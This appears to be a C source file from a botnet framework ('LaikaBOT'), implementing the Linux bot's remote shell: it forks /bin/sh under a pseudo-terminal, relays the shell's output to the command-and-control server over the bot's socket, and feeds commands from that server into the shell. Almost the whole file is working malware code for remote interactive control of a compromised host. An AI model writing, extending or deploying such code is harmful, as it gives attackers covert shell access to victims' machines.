/* platform specific code for opening shells in linux */

#include "bot.h"
#include "core/lerror.h"
#include "core/lmem.h"
#include "core/ltask.h"
#include "shell.h"

#include <pty.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define LAIKA_LINSHELL_PATH "/bin/sh"

struct sLaika_RAWshell
{
    struct sLaika_shell _shell;
    int pid;
    int fd;
};

struct sLaika_shell *laikaB_newRAWShell(struct sLaika_bot *bot, int cols, int rows, uint32_t id)
{
    struct winsize ws;
    struct sLaika_RAWshell *shell =
        (struct sLaika_RAWshell *)laikaM_malloc(sizeof(struct sLaika_RAWshell));

    ws.ws_col = cols;
    ws.ws_row = rows;
    shell->pid = forkpty(&shell->fd, NULL, NULL, &ws);
    shell->_shell.id = id;

    if (shell->pid == 0) {
        /* child process, clone & run shell */
        execlp(LAIKA_LINSHELL_PATH, "sh", (char *)NULL);
        exit(0);
    }

    /* make sure our calls to read() & write() do not block */
    if (fcntl(shell->fd, F_SETFL, (fcntl(shell->fd, F_GETFL, 0) | O_NONBLOCK)) != 0) {
        laikaB_freeShell(bot, (struct sLaika_shell *)shell);
        LAIKA_ERROR("Failed to set shell fd O_NONBLOCK");
    }

    return (struct sLaika_shell *)shell;
}

void laikaB_freeRAWShell(struct sLaika_bot *bot, struct sLaika_shell *_shell)
{
    struct sLaika_RAWshell *shell = (struct sLaika_RAWshell *)_shell;

    /* kill the shell */
    kill(shell->pid, SIGTERM);
    close(shell->fd);

    laikaM_free(shell);
}

/* ====================================[[ Shell Handlers ]]===================================== */

bool laikaB_readShell(struct sLaika_bot *bot, struct sLaika_shell *_shell)
{
    char readBuf[LAIKA_SHELL_DATA_MAX_LENGTH - sizeof(uint32_t)];
    struct sLaika_peer *peer = bot->peer;
    struct sLaika_socket *sock = &peer->sock;
    struct sLaika_RAWshell *shell = (struct sLaika_RAWshell *)_shell;

    int rd = read(shell->fd, readBuf, LAIKA_SHELL_DATA_MAX_LENGTH - sizeof(uint32_t));

    if (rd > 0) {
        /* we read some input! send to cnc */
        laikaS_startVarPacket(peer, LAIKAPKT_SHELL_DATA);
        laikaS_writeInt(sock, &shell->_shell.id, sizeof(uint32_t));
        laikaS_write(sock, readBuf, rd);
        laikaS_endVarPacket(peer);
    } else if (rd == -1) {
        if (LN_ERRNO == LN_EWOULD || LN_ERRNO == EAGAIN)
            return true; /* recoverable, there was no data to read */
        /* not EWOULD or EAGAIN, must be an error! so close the shell */
        laikaB_freeShell(bot, _shell);
        return false;
    }

    return true;
}

bool laikaB_writeShell(struct sLaika_bot *bot, struct sLaika_shell *_shell, char *buf,
                       size_t length)
{
    struct sLaika_peer *peer = bot->peer;
    struct sLaika_socket *sock = &peer->sock;
    struct sLaika_RAWshell *shell = (struct sLaika_RAWshell *)_shell;
    size_t nLeft;
    int nWritten;

    nLeft = length;
    while (nLeft > 0) {
        if ((nWritten = write(shell->fd, buf, nLeft)) < 0) {
            /* some error occurred */
            if (length == nLeft) {
                /* unrecoverable error */
                laikaB_freeShell(bot, _shell);
                return false;
            } else { /* recoverable */
                break;
            }
        } else if (nWritten == 0) {
            break;
        }
        nLeft -= nWritten;
        buf += nWritten;
    }

    return true;
}